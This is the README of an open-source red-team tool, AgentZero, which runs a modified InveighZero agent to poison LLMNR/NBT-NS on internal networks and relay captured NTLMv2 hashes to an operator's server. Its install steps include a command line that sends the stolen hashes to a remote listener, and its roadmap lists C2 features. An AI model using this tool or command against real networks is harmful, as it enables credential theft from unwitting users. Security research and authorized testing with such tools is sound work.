<p align="center">

![GitHub Repo stars](https://img.shields.io/github/stars/HuskyHacks/AgentZero?style=social)
![GitHub last commit](https://img.shields.io/github/last-commit/HuskyHacks/AgentZero)
![GitHub](https://img.shields.io/github/license/HuskyHacks/AgentZero)
![GitHub language count](https://img.shields.io/github/languages/count/HuskyHacks/AgentZero)
![GitHub top language](https://img.shields.io/github/languages/top/huskyHacks/AgentZero)

# AgentZero
A client-server tool for remote LLMNR/NBTNS poisoning by Matt Kiely (HuskyHacks) and Aaron Hobdy.

## WARNING
This tool does not yet provide any encryption of data on the wire. **Do not use this to transmit captured authentication material outside of a private, internal network.** The dev team is not liable if you use this in a production environment and leak plain text authentication data out to the Internet.

This tool is also not currently built with security best practices in mind. There is no authentication mechanism for the main web server yet. Keep this in mind before hosting this tool on your network. **Never host this on an internet facing server.**

### Description
Inveigh is the work of Kevin Robertson and is one of the best tools available for poisoning LLMNR/NBTNS in a target network. Traditionally, tools like Responder.py have been used to respond to LLMNR/NBTNS and force the client to attempt an authentication to the responder server, which allows an attacker to capture the NTLMv2 hash of the client. However, this method has one big shortfall: the attacker must be present on the network where Responder is running, which is not always feasible. Inveigh and InveighZero have the interesting capability of being able to be run via PowerShell or as a reflective .NET assembly, respectively. This allows an operator to gain a foothold with a C2 agent, load Inveigh into their C2 agent's session, and use it to respond to LLMNR on the target network.

Recently, we found that we were running Inveigh as a .NET assembly through a C2 agent in order to recover NTLMv2 hashes remotely. This works great on platforms like Covenant and Cobalt Strike! Running Inveigh through a C2 agent means that an operator does not have to be present on the subnet where they want to recover NTLMv2 hashes. We wanted to make this process into a stand-alone client/server tool and hopefully define it as its own method of extracting authentication information. Thus, **AgentZero** was born.

**AgentZero** uses a modified version of the InveighZero source code to create an agent binary that can exfiltrate capture authentication messages from an internal network out to an operator-controlled server. This allows for remote LLMNR poisoning that can recover cryptographic authentication messages.  

### Quick Install Guide

UNDER CONSTRUCTION

1. `sudo git clone https://github.com/HuskyHacks/AgentZero.git`
2. `cd AgentZero`
3. `sudo docker-compose up --build`
4. Compile the InveighZero-master binary that is packeged in the code.
5. Drop this binary to disk or run as an assembly with the `-EXFILURL` argument: `InveighZero.exe -EXFILRUL http://[ip]:1776/listener`
6. Wait for (or force) an LLMNR/NBTNS event
7. Captured hashes are stored in the dockerized DB.

### Roadmap
v.01
- [x] Python socket server that accepts input and writes to log file
- [x] InveighZero exe that sends captured NTLMv2 hash to server
- [x] Flask App
- [x] Stores in database

v.02
- [ ] Encoding/encrypting for exfil
  - [x] Base64 encoding
  - [ ] Asymmetrical Key exchange at compilation/agent check in
- [ ] Simple front-end login, set password on server at docker build
    - [ ] Server handles sessions, login actually functions
- [x] Dynamically compile InveighZero with IP address and port
  - [x] Compilation function
  - [x] Controlled from UI

future state
- [ ] Cool art for github page
- [ ] Multi-threaded, multi-agent handling
- [ ] Front end web client for multi-agent config/administration
- [ ] Dynamic generation for listener URL
- [ ] "Dashboard" for default view with DAG representation of agents 
- [ ] Shellcode gen for agent
- [ ] Basic command execution
- [ ] Malleable C2

## Acknowledgements
The dev team would like to thank Kevin Robertson for making an incredible program! Thanks also goes out to the devs of Covenant, Cobalt Strike, Empire, and all other C2s that we love.

## Disclaimer
There is no way to make an offensive security relevant research tool and release it open source without the possibility of it falling into the wrong hands. **This tool is only to be used for legal, ethical purposes including, but not limited to, research, security assessment, education. The dev team is not responsible for the misuse of this tool by anyone if used for illegal/unethical purposes.**

The graphic work in this repository is fan art. Likeness to real-world copyrighted material should not be inferred. No animals were harmed in the making of this code base (although Cosmo keeps climbing on my keyboard and I have to put him over on the couch, which I'm sure must feel like torture to him).
